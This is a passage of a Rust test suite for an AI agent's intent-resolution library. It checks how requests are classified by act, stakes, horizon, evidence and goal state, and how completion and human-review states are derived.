        &Authority::default(),
        &ResolverConfig::default(),
    )
    .intent();
    assert_eq!(
        intent.reading.stakes,
        Stakes::Inert,
        "dirty tree should not raise stakes for non-effectful acts"
    );
}

#[test]
fn edge_empty_attachments_does_not_add_image_modality() {
    let intent = resolve_text("what is 2 + 2");
    assert!(intent.reading.input_modalities.contains(&Modality::Text));
    assert!(!intent.reading.input_modalities.contains(&Modality::Image));
}

// ================================================================
// Part 12: Surface and attendance propagation
// ================================================================

#[test]
fn surface_attendance_mapping() {
    assert_eq!(Surface::Cron.implied_attendance(), Attendance::Unattended);
    assert_eq!(Surface::Cli.implied_attendance(), Attendance::Interactive);
    assert_eq!(
        Surface::Desktop.implied_attendance(),
        Attendance::Interactive
    );
    assert_eq!(Surface::Chat.implied_attendance(), Attendance::Supervised);
    assert_eq!(Surface::Server.implied_attendance(), Attendance::Supervised);
    assert_eq!(
        Surface::Heartbeat.implied_attendance(),
        Attendance::Unattended
    );
    assert_eq!(Surface::Worker.implied_attendance(), Attendance::Unattended);
}

#[test]
fn surface_parse_accepts_aliases() {
    assert_eq!(Surface::parse("terminal"), Some(Surface::Cli));
    assert_eq!(Surface::parse("telegram"), Some(Surface::Chat));
    assert_eq!(Surface::parse("task"), Some(Surface::Cron));
    assert_eq!(Surface::parse("tauri"), Some(Surface::Desktop));
    assert_eq!(Surface::parse("unknown"), None);
}

#[test]
fn attendance_override_beats_surface() {
    let mut request = req("do something");
    request.surface = Surface::Cron;
    request.attendance_override = Some(Attendance::Interactive);
    assert_eq!(extract(&request).attendance, Attendance::Interactive);

    let mut request2 = req("do something");
    request2.surface = Surface::Cli;
    request2.attendance_override = Some(Attendance::Unattended);
    assert_eq!(extract(&request2).attendance, Attendance::Unattended);
}

// ================================================================
// Part 13: Deixis resolution
// ================================================================

#[test]
fn deictic_resolution_with_history() {
    let mut request = req("fix this");
    request.history.turn_index = 3;
    request.history.previous_act = Some(Act::Modify);
    let extraction = extract(&request);
    let clarity = extraction.clarity.winner().map(|w| w.0);
    assert_ne!(
        Some(Clarity::Ambiguous),
        clarity,
        "with history, 'this' should not be ambiguous"
    );
}

/// An attachment is something to point at: "what is this" with a screenshot
/// attached refers to the screenshot.
#[test]
fn deictic_clear_with_an_attachment() {
    let attachments = vec![Attachment {
        modality: Modality::Image,
        name: "screenshot.png".into(),
    }];
    let mut request = req("what is this");
    request.attachments = &attachments;
    let extraction = extract(&request);
    let clarity = extraction.clarity.winner().map(|w| w.0);
    assert_eq!(
        Some(Clarity::Clear),
        clarity,
        "with an attachment, 'this' should be clear"
    );
}

/// `that` as a relative pronoun points at nothing: only a request that ends
/// on a bare pronoun is missing its object.
#[test]
fn deictic_relative_pronouns_are_not_ambiguous() {
    for text in [
        "Write a function that parses ISO dates",
        "find the test that fails on CI",
        "is there a way to cache the build",
    ] {
        assert_ne!(
            extract(&req(text)).clarity.winner().map(|w| w.0),
            Some(Clarity::Ambiguous),
            "`{text}`"
        );
    }
}

// ================================================================
// Part 14: Goal classification
// ================================================================

#[test]
fn goal_relation_follows_explicit_commands_only() {
    use vak_intent::goal::goal_relation;
    use vak_intent::outcome::parse_command;
    let cases: &[(Option<u64>, &str, GoalRelation)] = &[
        (Some(1), "/status", GoalRelation::Status),
        (Some(1), "status", GoalRelation::Status),
        (Some(1), "/pause", GoalRelation::Pauses),
        (Some(1), "pause", GoalRelation::Pauses),
        (Some(1), "/resume", GoalRelation::Resumes),
        (Some(1), "cancel", GoalRelation::Cancels),
        (Some(1), "Stop.", GoalRelation::Cancels),
        (
            Some(1),
            "/goal fix use the other approach",
            GoalRelation::Corrects,
        ),
        (
            Some(1),
            "/goal replace just add the index",
            GoalRelation::Replaces,
        ),
        // Natural language that used to be a correction/replacement/cancel
        // is an addition to the active goal now.
        (Some(1), "actually do it differently", GoalRelation::AddsTo),
        (
            Some(1),
            "forget that, do something else instead",
            GoalRelation::AddsTo,
        ),
        (Some(1), "stop using semicolons", GoalRelation::AddsTo),
        (Some(1), "pause the work", GoalRelation::AddsTo),
        (Some(1), "how is it going", GoalRelation::AddsTo),
        (None, "actually do it differently", GoalRelation::New),
        (None, "/goal replace whatever", GoalRelation::New),
        (None, "also include a CSV", GoalRelation::New),
    ];
    let live = GoalState::from_updates([GoalUpdate {
        revision: 1,
        relation: GoalRelation::New,
        request: "prepare the briefing".into(),
        supersedes_revision: None,
        explicit: false,
    }]);
    for (active, text, expected) in cases {
        let goal = active.and(live.as_ref());
        let result = goal_relation(parse_command(text).as_ref(), goal);
        assert_eq!(
            result, *expected,
            "active={:?} text=`{}` should be {:?}",
            active, text, expected
        );
    }
}

#[test]
fn goal_state_projection_from_updates() {
    let state = GoalState::from_updates([
        GoalUpdate {
            revision: 1,
            relation: GoalRelation::New,
            request: "prepare a briefing".into(),
            supersedes_revision: None,
            explicit: false,
        },
        GoalUpdate {
            revision: 2,
            relation: GoalRelation::AddsTo,
            request: "include sources".into(),
            supersedes_revision: None,
            explicit: false,
        },
        GoalUpdate {
            revision: 3,
            relation: GoalRelation::Replaces,
            request: "just add an index instead".into(),
            supersedes_revision: Some(1),
            explicit: false,
        },
        GoalUpdate {
            revision: 4,
            relation: GoalRelation::Status,
            request: "status".into(),
            supersedes_revision: None,
            explicit: false,
        },
    ]);
    assert!(state.is_some());
    let state = state.unwrap();
    assert_eq!(state.objective, "just add an index instead");
    assert!(state.additions.is_empty());
    assert_eq!(state.superseded_revisions, vec![1]);
    assert_eq!(state.control, GoalControlState::Active);
}

#[test]
fn goal_projections_control_states() {
    let state = GoalState::from_updates([
        GoalUpdate {
            revision: 1,
            relation: GoalRelation::New,
            request: "task".into(),
            supersedes_revision: None,
            explicit: false,
        },
        GoalUpdate {
            revision: 2,
            relation: GoalRelation::Pauses,
            request: "pause".into(),
            supersedes_revision: None,
            explicit: false,
        },
    ]);
    assert!(state.is_some());
    assert_eq!(state.unwrap().control, GoalControlState::Paused);

    let state = GoalState::from_updates([
        GoalUpdate {
            revision: 1,
            relation: GoalRelation::New,
            request: "task".into(),
            supersedes_revision: None,
            explicit: false,
        },
        GoalUpdate {
            revision: 2,
            relation: GoalRelation::Pauses,
            request: "pause".into(),
            supersedes_revision: None,
            explicit: false,
        },
        GoalUpdate {
            revision: 3,
            relation: GoalRelation::Resumes,
            request: "resume".into(),
            supersedes_revision: None,
            explicit: false,
        },
    ]);
    assert!(state.is_some());
    assert_eq!(state.unwrap().control, GoalControlState::Active);

    let state = GoalState::from_updates([
        GoalUpdate {
            revision: 1,
            relation: GoalRelation::New,
            request: "task".into(),
            supersedes_revision: None,
            explicit: false,
        },
        GoalUpdate {
            revision: 2,
            relation: GoalRelation::Cancels,
            request: "cancel".into(),
            supersedes_revision: None,
            explicit: false,
        },
    ]);
    assert!(state.is_some());
    assert_eq!(state.unwrap().control, GoalControlState::Cancelled);
}

// ================================================================
// Part 15: Outcome evaluation
// ================================================================

#[test]
fn outcome_completion_verdict_matrix() {
    let reading = Reading {
        act: Act::Modify,
        evidence: Evidence::Cited,
        ..Reading::general()
    };
    let spec = OutcomeSpec::from_reading("research", &reading, 1);

    let all_met = vec![
        RequirementEvaluation {
            requirement_id: "deliverable-1".into(),
            status: RequirementStatus::Met,
            reason: "content exists".into(),
        },
        RequirementEvaluation {
            requirement_id: "evidence-1".into(),
            status: RequirementStatus::Met,
            reason: "sources cited".into(),
        },
    ];
    assert_eq!(
        evaluate_completion(OutcomeStatus::Produced, &all_met, &spec),
        CompletionVerdict::Complete
    );

    let partial = vec![
        RequirementEvaluation {
            requirement_id: "deliverable-1".into(),
            status: RequirementStatus::Met,
            reason: "content exists".into(),
        },
        RequirementEvaluation {
            requirement_id: "evidence-1".into(),
            status: RequirementStatus::Unmet,
            reason: "no evidence".into(),
        },
    ];
    assert_eq!(
        evaluate_completion(OutcomeStatus::Produced, &partial, &spec),
        CompletionVerdict::Partial
    );

    let unknown_evals = vec![
        RequirementEvaluation {
            requirement_id: "deliverable-1".into(),
            status: RequirementStatus::Met,
            reason: "content exists".into(),
        },
        RequirementEvaluation {
            requirement_id: "evidence-1".into(),
            status: RequirementStatus::Unknown,
            reason: "sources cited but unverified".into(),
        },
    ];
    assert_eq!(
        evaluate_completion(OutcomeStatus::Produced, &unknown_evals, &spec),
        CompletionVerdict::Unknown
    );

    assert_eq!(
        evaluate_completion(OutcomeStatus::Failed, &[], &spec),
        CompletionVerdict::Failed
    );
    assert_eq!(
        evaluate_completion(OutcomeStatus::Cancelled, &[], &spec),
        CompletionVerdict::Cancelled
    );
}

#[test]
fn outcome_evaluation_refusal_is_not_met() {
    let reading = Reading {
        act: Act::Author,
        evidence: Evidence::None,
        ..Reading::general()
    };
    let mut spec = OutcomeSpec::from_reading("create a report", &reading, 1);
    spec.merge_declared_requirement("report", "deliverable", "create report.md", "must", None)
        .unwrap();

    let evaluations = evaluate_requirements(&spec, Some("I cannot do that."));
    assert_eq!(evaluations[1].status, RequirementStatus::Unknown);
    assert_eq!(
        evaluate_completion(OutcomeStatus::Produced, &evaluations, &spec),
        CompletionVerdict::Unknown
    );
}

#[test]
fn outcome_spec_from_reading_preserves_evidence_max_age() {
    let cases: &[(Evidence, Option<i64>)] = &[
        (Evidence::None, None),
        (Evidence::Cited, Some(86_400)),
        (Evidence::Verified, Some(3_600)),
        (Evidence::Audited, Some(3_600)),
    ];
    for (evidence, expected_max_age) in cases {
        let reading = Reading {
            act: Act::Modify,
            evidence: *evidence,
            ..Reading::general()
        };
        let spec = OutcomeSpec::from_reading("test", &reading, 1);
        assert_eq!(spec.evidence_max_age_secs, *expected_max_age);
    }
}

#[test]
fn outcome_evidence_state_age_based() {
    let now = chrono::Utc::now();
    assert_eq!(
        evidence_state_from_age(
            now,
            now - chrono::Duration::hours(1),
            chrono::Duration::hours(2)
        ),
        EvidenceState::Fresh
    );
    assert_eq!(
        evidence_state_from_age(
            now,
            now - chrono::Duration::hours(3),
            chrono::Duration::hours(2)
        ),
        EvidenceState::Stale
    );
    assert_eq!(
        evidence_state_from_age(
            now,
            now + chrono::Duration::minutes(1),
            chrono::Duration::hours(2)
        ),
        EvidenceState::Fresh
    );
}

#[test]
fn outcome_human_review_state() {
    assert_eq!(
        human_review_state(CompletionVerdict::Complete),
        "not_required"
    );
    assert_eq!(
        human_review_state(CompletionVerdict::Partial),
        "recommended"
    );
    assert_eq!(
        human_review_state(CompletionVerdict::Unknown),
        "recommended"
    );
    assert_eq!(
        human_review_state(CompletionVerdict::Failed),
        "required_for_recovery"
    );
    assert_eq!(
        human_review_state(CompletionVerdict::Cancelled),
        "required_for_recovery"
    );
}

#[test]
fn outcome_extension_requirements_validation() {
    let mut spec = OutcomeSpec::from_reading("make a plan", &Reading::general(), 1);
    assert!(
        spec.merge_declared_requirement(
            "plan-structure",
            "constraint",
            "include assumptions and next steps",
            "must",
            Some("primary".into())
        )
        .is_ok()
    );
    assert!(
        spec.merge_declared_requirement("", "constraint", "x", "must", None)
            .is_err()
    );
    assert!(
        spec.merge_declared_requirement("bad", "grant", "x", "must", None)
            .is_err()
    );
    // First insertion of "dup" must succeed; the second must fail.
    assert!(
        spec.merge_declared_requirement("dup", "constraint", "x", "must", None)
            .is_ok()
    );
    assert!(
        spec.merge_declared_requirement("dup", "constraint", "y", "must", None)
            .is_err()
    );
}

/// The live bug: every writing request tripped the agent's stop gate,
/// because `OutcomeSpec::requires_execution` returned true for any
/// `Act::Author` reading and `vak-agent`'s stop policy reads
/// `spec.stop == StopProfile::Effect || spec.requires_execution()`.
/// Authoring content — a poem, an email, a summary, a plan, prose of any
/// length — must not demand a bash or file-modification receipt, and its
/// stop profile must not be `Effect` or `Verification`.
#[test]
fn authoring_prose_does_not_require_an_execution_receipt() {
    for prompt in [
        "write a short poem about the sea",
        "draft an email to my landlord asking to fix the heater",
        "write a summary of this article",
        "Write a lot.",
    ] {
        let intent = resolve_text(prompt);
        let spec = OutcomeSpec::from_intent(prompt, &intent);
        assert!(
            !spec.requires_execution(),
            "{prompt:?}: acts={:?} expects_saved_file={} should not require execution",
            spec.acts,
            spec.expects_saved_file()
        );
        assert_ne!(
            spec.stop,
            StopProfile::Effect,
            "{prompt:?}: stop profile should not be Effect"
        );
        assert_ne!(
            spec.stop,
            StopProfile::Verification,
            "{prompt:?}: stop profile should not be Verification"
        );
    }
}

/// The one case authoring genuinely needs a receipt: the request names a
/// file deliverable outright. `Act` alone cannot see this — only
/// `OutcomeSpec`, which has the request text via `expects_saved_file`.
#[test]
fn authoring_with_a_named_file_target_requires_an_execution_receipt() {
    let prompt = "write a Python script that parses logs and save it as parse.py";
    let intent = resolve_text(prompt);
    let spec = OutcomeSpec::from_intent(prompt, &intent);
    assert!(spec.expects_saved_file(), "acts={:?}", spec.acts);
    assert!(spec.requires_execution());
}

/// Genuinely effectful work and verification are unaffected by the
/// authoring fix: they must keep demanding an execution receipt.
#[test]
fn effectful_and_verification_requests_still_require_execution() {
    for prompt in [
        "fix the failing test",
        "deploy the billing service to production",
        "rename the config key in settings.toml",
    ] {
        let intent = resolve_text(prompt);
        let spec = OutcomeSpec::from_intent(prompt, &intent);
        assert!(
            spec.requires_execution(),
            "{prompt:?}: acts={:?} should still require execution",
            spec.acts
        );
    }
}

/// `Orchestrate` mirrors `Author`: dispatching a worker is proven by a tool
/// call, not a shell command or a file write, so it must not demand an
/// execution receipt — but unlike a plain answer it still must demand *some*
/// tool call, or a claimed delegation with nothing dispatched would pass.
#[test]
fn orchestrate_requires_a_tool_but_not_an_execution_receipt() {
    let reading = Reading {
        act: Act::Orchestrate,
        ..Reading::general()
    };
    let spec = OutcomeSpec::from_reading("delegate this across three workers", &reading, 1);
    assert!(!spec.requires_execution());
    assert!(spec.requires_tool());
}

// ================================================================
// Part 16: Resolution determinism and reproducibility
// ================================================================

#[test]
fn resolution_is_deterministic_across_runs() {
    let cases = &[
        "hello",
        "deploy to production",
        "fix the bug and send me a report",
        "what is the meaning of life the universe and everything",
        "analyze the logs and find the error",
    ];
    for text in cases {
        let a = resolve_text(text);
        let b = resolve_text(text);
        assert_eq!(a, b, "resolution not deterministic for `{}`", text);
    }
}

#[test]
fn resolution_tier_reproducibility() {
    let declared = Declared {
        act: Some(Act::Modify),
        ..Declared::default()
    };
    let intent = resolve_declared("hello", &declared);
    // Partial declaration (only act) → coverage < 1.0 → Signals tier.
    // Full declaration of all four axes is required for Declared tier.
    assert_eq!(intent.provenance.tier, Tier::Signals);
    assert!(intent.provenance.reproducible);

    let intent = resolve_text("zorble frobnicate xyzzy");
    assert_eq!(intent.provenance.tier, Tier::General);
    assert!(intent.provenance.reproducible);

    let intent = resolve_text("deploy to production");
    if intent.provenance.tier == Tier::Signals {
        assert!(intent.provenance.reproducible);
    }
}

#[test]
fn resolution_note_reaches_model() {
    let intent = resolve_text("deploy to production");
    assert!(
        intent.model_visible().is_some() || intent.engagement.posture.note.is_none(),
        "irreversible work should produce a model-visible note"
    );
}

// ================================================================
// Part 17: Domain and capability slicing
// ================================================================

#[test]
fn slicing_keeps_orientation_floor() {
    let r = reading_simple(
        Act::Converse,
        Horizon::Immediate,
        Stakes::Inert,
        Evidence::None,
    );
    let engagement = derive(&r, &Authority::default(), true);
    for domain in vak_intent::FLOOR_DOMAINS.iter() {
        assert!(
            engagement.limits.required_domains.contains(domain),
            "floor domain `{}` must survive slicing",
            domain
        );
    }
}

#[test]
fn slicing_withheld_gives_the_orientation_floor() {
    let r = reading_simple(
        Act::Converse,
        Horizon::Immediate,
        Stakes::Inert,
        Evidence::None,
    );
    let engagement = derive(&r, &Authority::default(), false);
    assert_eq!(
        engagement.limits.required_domains,
        Engagement::orienting().limits.required_domains
    );
}

#[test]
fn below_floor_confidence_gives_the_orientation_floor() {
    let resolution = resolve(
        &req("zorble frobnicate"),
        &Declared::default(),
        &Authority::default(),
        &ResolverConfig::default(),
    );
    let intent = resolution.intent();
    assert_eq!(intent.provenance.tier, Tier::General);
    assert_eq!(
        intent.engagement.limits.required_domains,
        Engagement::orienting().limits.required_domains
    );
}

/// `DomainSet::All` has exactly one meaning — everything — and only a
/// disabled kernel produces it.
#[test]
fn only_a_disabled_kernel_is_unconstrained() {
    let config = ResolverConfig {
        enabled: false,
        ..ResolverConfig::default()
    };
    let intent = resolve(
        &req("zorble frobnicate"),
        &Declared::default(),
        &Authority::default(),
        &config,
    )
    .intent();
    assert!(intent.engagement.limits.required_domains.is_unconstrained());
}

// ================================================================
// Part 18: Capacity is never capped by a reading
// ================================================================

/// A reading decides which tools are loaded, never what is possible. The
/// route ladder, the turn count and the worker budget are not part of the
/// lattice at all, so no reading — right or wrong — can take them away; the
/// only limits a reading carries are authority-bearing ones.
#[test]
fn a_reading_carries_no_capacity_limit() {
    for &act in &Act::ALL {
        for &horizon in &Horizon::ALL {
            let r = reading_simple(act, horizon, Stakes::Inert, Evidence::None);
            let limits = derive(&r, &Authority::default(), true).limits;
            assert_eq!(
                limits.spend_ceiling_usd, None,
                "{act:?}/{horizon:?}: no spend cap without a grant"
            );
            assert_eq!(
                limits.permission_ceiling,
                PermissionCeiling::FullAccess,
                "{act:?}/{horizon:?}: no permission cap without a grant"
            );
        }
    }
}

// ================================================================
// Part 19: Act is_effectful classification
// ================================================================

#[test]
fn act_is_effectful_classification() {
    assert!(!Act::Converse.is_effectful());
    assert!(!Act::Answer.is_effectful());
    assert!(!Act::Locate.is_effectful());
    assert!(!Act::Analyze.is_effectful());
    assert!(!Act::Author.is_effectful());
    assert!(Act::Modify.is_effectful());
    assert!(Act::Operate.is_effectful());
    assert!(Act::Govern.is_effectful());
    // Verify and Orchestrate are not effectful — only Modify|Operate|Govern
    // produce side-effects that matter for the stop profile.
    assert!(!Act::Verify.is_effectful());
    assert!(!Act::Orchestrate.is_effectful());
    assert!(!Act::Author.is_effectful());
}

/// `requires_execution` is the bash-or-file-receipt gate the stop policy
/// reads (`spec.requires_execution()` in `vak-agent/src/stop_policy.rs`).
/// `Author` producing prose is proven by the response itself, so it is
/// absent; `Orchestrate` dispatching a worker is proven by a tool call
/// rather than a shell command or a file write, so it lives under
/// `requires_tool`. `Verify` lives there too: checking a pasted paragraph or
/// a translation is proven by a source, a computation or a careful reading
/// as often as by a command, and a check the request demands be *proven* is
/// the evidence axis's job (`StopProfile::Verification`).
#[test]
fn act_requires_execution_and_requires_tool_classification() {
    for act in [Act::Modify, Act::Operate, Act::Govern] {
        assert!(act.requires_execution(), "{act:?} should require execution");
        assert!(act.requires_tool(), "{act:?} should require a tool");
    }
    for act in [
        Act::Converse,
        Act::Answer,
        Act::Locate,
        Act::Analyze,
        Act::Author,
        Act::Orchestrate,
        Act::Verify,
    ] {
        assert!(
            !act.requires_execution(),
            "{act:?} should not require an execution/file receipt"
        );
    }
    // Orchestrate and Verify still need a tool or, for Verify, a substantive
    // answer about material the request carried.
    assert!(Act::Orchestrate.requires_tool());
    assert!(Act::Verify.requires_tool());
    for act in [Act::Converse, Act::Answer, Act::Analyze, Act::Author] {
        assert!(!act.requires_tool(), "{act:?} should not require a tool");
    }
    assert!(Act::Locate.requires_tool());
}

#[test]
fn implied_stakes_visible_through_resolve() {
    assert_eq!(
        resolve_text("deploy the service").reading.stakes,
        Stakes::Irreversible
    );
    // Governing the agent's own configuration is reversible; the permission
    // engine and the privileged-config rules guard it.
    assert_eq!(
        resolve_text("configure the gateway").reading.stakes,
        Stakes::Reversible
    );
    assert_eq!(
        resolve_text("refactor the parser").reading.stakes,
        Stakes::Reversible
    );
    assert_eq!(resolve_text("what is life").reading.stakes, Stakes::Inert);
    assert_eq!(
        resolve_text("find the config").reading.stakes,
        Stakes::Inert
    );
    assert_eq!(
        resolve_text("analyze the logs").reading.stakes,
        Stakes::Inert
    );
    assert_eq!(
        resolve_text("write a report").reading.stakes,
        Stakes::Reversible
    );
    assert_eq!(
        resolve_text("fix the bug").reading.stakes,
        Stakes::Reversible
    );
    assert_eq!(
        resolve_text("test the parser").reading.stakes,
        Stakes::Reversible
    );
}

// ================================================================
// Part 20: Prompt note and surface propagation
// ================================================================

#[test]
fn prompt_note_for_ambiguous_high_stakes() {
    let mut r = reading_simple(
        Act::Operate,
        Horizon::Turn,
        Stakes::Irreversible,
        Evidence::None,
    );
    r.clarity = Clarity::Ambiguous;
    let engagement = derive(&r, &Authority::default(), true);
    let note = engagement.posture.note.as_deref().unwrap_or("");
    assert!(
        note.contains("ask") || note.contains("question") || note.contains("ambiguous"),
        "ambiguous high-stakes should mention asking: `{note}`"
    );
}

#[test]
fn prompt_note_for_state_assumption() {
    let mut r = reading_simple(Act::Answer, Horizon::Turn, Stakes::Inert, Evidence::None);
    r.clarity = Clarity::Ambiguous;
    let engagement = derive(&r, &Authority::default(), true);
    let note = engagement.posture.note.as_deref().unwrap_or("");
    assert!(
        note.contains("under-specified") || note.contains("assumption"),
        "under-specified should mention assumption: `{note}`"
    );
}

#[test]
fn prompt_note_for_deferred_work() {
    let r = reading_simple(
        Act::Operate,
        Horizon::Durable,
        Stakes::Costly,
        Evidence::None,
    );
    let auth = authority_of(Autonomy::Delegated, Attendance::Unattended);
    let engagement = derive(&r, &auth, true);
    let note = engagement.posture.note.as_deref().unwrap_or("");
    assert!(
        note.contains("Nobody") || note.contains("queued"),
        "deferred work should mention nobody available: `{note}`"
    );
}

// ================================================================
// Part 21: Modality requirements
// ================================================================

#[test]
fn required_modalities_only_non_text() {
    let mut r = Reading::general();
    r.input_modalities.insert(Modality::Text);
    r.input_modalities.insert(Modality::Data);
    assert!(r.required_modalities().is_empty());

    let mut r = Reading::general();
    r.input_modalities.insert(Modality::Image);
    r.input_modalities.insert(Modality::Text);
    assert_eq!(r.required_modalities(), BTreeSet::from([Modality::Image]));

    let mut r = Reading::general();
    r.input_modalities.insert(Modality::Image);
    r.input_modalities.insert(Modality::Audio);
    r.input_modalities.insert(Modality::Text);
    assert_eq!(
        r.required_modalities(),
        BTreeSet::from([Modality::Audio, Modality::Image])
    );
}

#[test]
fn modality_text_data_need_no_declared_support() {
    assert!(!Modality::Text.needs_declared_support());
    assert!(!Modality::Data.needs_declared_support());
    assert!(Modality::Image.needs_declared_support());
    assert!(Modality::Audio.needs_declared_support());
    assert!(Modality::Video.needs_declared_support());
    assert!(Modality::Screen.needs_declared_support());
    assert!(Modality::Stream.needs_declared_support());
}

// ================================================================
// Part 22: Thousands of generated combinations
// ================================================================

#[test]
fn thousands_of_act_horizon_stakes_combinations() {
    let act_verbs: &[(&[&str], Act)] = &[
        (&["hi", "hello", "hey", "bye", "thanks"], Act::Converse),
        (
            &[
                "what",
                "how",
                "why",
                "explain",
                "describe",
                "summarize",
                "tell",
            ],
            Act::Answer,
        ),
        (
            &["find", "search", "grep", "locate", "where", "list"],
            Act::Locate,
        ),
        (
            &[
                "analyze",
                "compare",
                "research",
                "investigate",
                "evaluate",
                "assess",
            ],
            Act::Analyze,
        ),
        (
            &[
                "write", "draft", "create", "generate", "design", "compose", "plan",
            ],
            Act::Author,
        ),
        (
            &[
                "fix",
                "refactor",
                "update",
                "change",
                "edit",
                "remove",
                "delete",
                "implement",
            ],
            Act::Modify,
        ),
        (
            &[
                "deploy", "restart", "send", "install", "schedule", "monitor", "pay",
            ],
            Act::Operate,
        ),
        (
            &["test", "verify", "check", "validate", "audit"],
            Act::Verify,
        ),
        (
            &["orchestrate", "coordinate", "delegate", "parallel"],
            Act::Orchestrate,
        ),
        (
            &["configure", "remember", "forget", "permission"],
            Act::Govern,
        ),
    ];

    let modifiers: &[&str] = &["", "please", "now", "quickly", "the", "a", "this"];
    let objects: &[&str] = &[
        "the bug",
        "the code",
        "the file",
        "the system",
        "the service",
        "it",
    ];

    let mut count = 0u64;
    for (verbs, _expected_act) in act_verbs {
        for verb in *verbs {
            for modifier in modifiers {
                for object in objects {
                    let text = format!("{} {} {}", modifier, verb, object)
                        .trim()
                        .to_string();
                    if text.is_empty() {
                        continue;
                    }
                    let extraction = extract(&req(&text));
                    let _ = extraction.act.winner();
                    let intent = resolve_text(&text);
                    assert!(intent.engagement.limits.is_at_most(&Limits::unrestricted()));
                    count += 1;
                }
            }
        }
    }
    assert!(
        count >= 2_000,
        "should have generated at least 2000 scenarios, got {}",
        count
    );
}

#[test]
fn thousands_of_horizon_combinations() {
    let recurrence_words: &[&str] = &[
        "every day",
        "every night",
        "every week",
        "every month",
        "every hour",
        "nightly",
        "monthly",
        "daily",
        "weekly",
        "hourly",
        "continuously",
        "whenever",
        "from now on",
        "ongoing",
    ];
    let verbs: &[&str] = &[
        "check", "monitor", "watch", "sync", "alert", "scan", "verify", "inspect",
    ];
    let subjects: &[&str] = &[
        "the logs",
        "the system",
        "the service",
        "the queue",
        "the metrics",
        "the database",
        "the cache",
        "the files",
        "the data",
    ];

    let mut count = 0u64;
    for word in recurrence_words {
        for verb in verbs {
            for subject in subjects {
                let text = format!("{} {} {}", verb, subject, word);
                let extraction = extract(&req(&text));
                let horizon = extraction.horizon.winner().map(|w| w.0);
                assert_eq!(
                    Some(Horizon::Durable),
                    horizon,
                    "`{}` should be Durable",
                    text
                );
                count += 1;
            }
        }
    }
    assert!(
        count >= 900,
        "should have tested {} durable combinations",
        count
    );
}

#[test]
fn thousands_of_stakes_combinations() {
    let stakes_words: &[(&str, Stakes)] = &[
        ("production", Stakes::Irreversible),
        ("prod", Stakes::Irreversible),
        ("live", Stakes::Irreversible),
        ("customer", Stakes::Irreversible),
        ("everyone", Stakes::Irreversible),
        ("permanently", Stakes::Irreversible),
        ("expensive", Stakes::Costly),
        ("budget", Stakes::Costly),
        ("quota", Stakes::Costly),
    ];
    let verbs: &[&str] = &[
        "deploy",
        "delete",
        "send",
        "modify",
        "refactor",
        "write",
        "fix",
        "create",
        "configure",
        "run",
        "start",
        "stop",
    ];
    let objects: &[&str] = &[
        "the service",
        "the database",
        "the file",
        "the config",
        "the system",
        "the account",
        "the record",
        "the setting",
    ];

    let mut count = 0u64;
    for (word, expected_stakes) in stakes_words {
        for verb in verbs {
            for object in objects {
                let text = format!("{} {} to {}", verb, object, word);
                let extraction = extract(&req(&text));
                let stakes = extraction.stakes_from_words.winner();
                if let Some((winner, _)) = stakes {
                    assert!(
                        winner.rank() >= expected_stakes.rank(),
                        "`{}`: expected >= {:?}, got {:?}",
                        text,
                        expected_stakes,
                        winner
                    );
                }
                count += 1;
            }
        }
    }
    assert!(
        count >= 800,
        "should have tested {} stakes combinations",
        count
    );
}

#[test]
fn thousands_of_evidence_combinations() {
    let evidence_words: &[(&str, Evidence)] = &[
        ("cite", Evidence::Cited),
        ("sources", Evidence::Cited),
        ("proof", Evidence::Verified),
        ("ensure", Evidence::Verified),
        ("audited", Evidence::Audited),
        ("acceptance", Evidence::Audited),
    ];
    let verbs: &[&str] = &[
        "deploy", "fix", "write", "analyze", "research", "verify", "test",
    ];
    let objects: &[&str] = &[
        "the report",
        "the bug",
        "the system",
        "the code",
        "the data",
    ];

    let mut count = 0u64;
    for (word, expected_ev) in evidence_words {
        for verb in verbs {
            for object in objects {
                let text = format!("{} {} with {}", verb, object, word);
                let extraction = extract(&req(&text));
                let evidence = extraction.evidence.winner();
                if let Some((winner, _)) = evidence {
                    assert_eq!(
                        winner, *expected_ev,
                        "`{}`: expected {:?}, got {:?}",
                        text, expected_ev, winner
                    );
                }
                count += 1;
            }
        }
    }
    assert!(
        count >= 200,
        "should have tested {} evidence combinations",
        count
    );
}

#[test]
fn thousands_of_resolution_does_not_crash() {
    let templates: &[&str] = &[
        "deploy the service",
        "fix the failing test",
        "write a comprehensive report on",
        "analyze the data and compare it with",
        "find all instances of",
        "refactor the parser to handle",
        "configure the gateway with the new settings",
        "verify the fix works on",
        "schedule a backup of",
        "monitor the system for",
        "what is the status of",
        "explain how the parser works with",
        "create a new file called",
        "remove the old",
        "update the configuration for",
        "search for all",
        "test the integration with",
        "audit the code for",
        "govern the settings for",
        "orchestrate the migration of",
    ];
    let suffixes: &[&str] = &[
        "",
        "please",
        "now",
        "urgently",
        "in production",
        "with citations",
        "every day",
        "with the team",
        "before deploying",
        "and send me a report",
        "and verify the result",
        "and then deploy it",
        "to production",
        "and make sure it works",
        "with sources",
        "for the audit",
    ];

    let mut count = 0u64;
    for template in templates {
        for suffix in suffixes {
            let text = format!("{} {}", template, suffix).trim().to_string();
            if text.is_empty() || text.len() > 500 {
                continue;
            }
            let intent = resolve_text(&text);
            assert!(
                intent.engagement.limits.is_at_most(&Limits::unrestricted()),
                "narrowing invariant violated for `{}`",
                text
            );
            count += 1;
        }
    }
    assert!(
        count >= 300,
        "should have tested {} resolution combinations",
        count
    );
}

#[test]
fn thousands_of_engagement_matrix_combinations() {
    let mut count = 0u64;
    for &act in &Act::ALL {
        for &stakes in &Stakes::ALL {
            for &evidence in &Evidence::ALL {
                for &autonomy in &Autonomy::ALL {
                    for &attendance in &Attendance::ALL {
                        let r = reading_simple(act, Horizon::Session, stakes, evidence);
                        let auth = authority_of(autonomy, attendance);
                        let engagement = derive(&r, &auth, true);
                        assert!(engagement.limits.is_at_most(&Limits::unrestricted()));
                        count += 1;
                    }
                }
            }
        }
    }
    assert_eq!(count, 10 * 4 * 4 * 4 * 3);
}

#[test]
fn thousands_of_lattice_meet_pairs() {
    let mut engagements = Vec::new();
    for &act in &Act::ALL {
        for &horizon in &Horizon::ALL {
            for &stakes in &Stakes::ALL {
                for &evidence in &Evidence::ALL {
                    for slice in [true, false] {
                        let r = reading_simple(act, horizon, stakes, evidence);
                        engagements.push(derive(&r, &Authority::default(), slice));
                    }
                }
            }
        }
    }

    let baseline = Limits::unrestricted();
    let mut tested = 0u64;
    for i in 0..engagements.len() {
        for j in (i + 1)..engagements.len() {
            if (i + j) % 17 != 0 {
                continue;
            }
            let met = engagements[i].limits.meet(&engagements[j].limits);
            assert!(met.is_at_most(&engagements[i].limits));
